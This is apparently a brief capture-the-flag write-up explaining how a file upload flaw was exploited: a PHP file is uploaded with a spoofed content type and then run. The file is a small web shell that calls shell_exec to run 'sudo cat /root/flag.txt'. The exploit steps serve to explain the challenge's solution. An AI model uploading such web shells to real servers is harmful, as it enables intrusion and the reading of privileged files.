This is a file upload vulnerability. We can arbitrarily upload any file and execute it. I've uploaded a php file (make sure to set Content-Type to application/x-httpd-php). It's also possible to use the `sudo` command so we use that to read the flag.

```php
<?php
$output = shell_exec('sudo cat /root/flag.txt');
echo $output;
?>
```
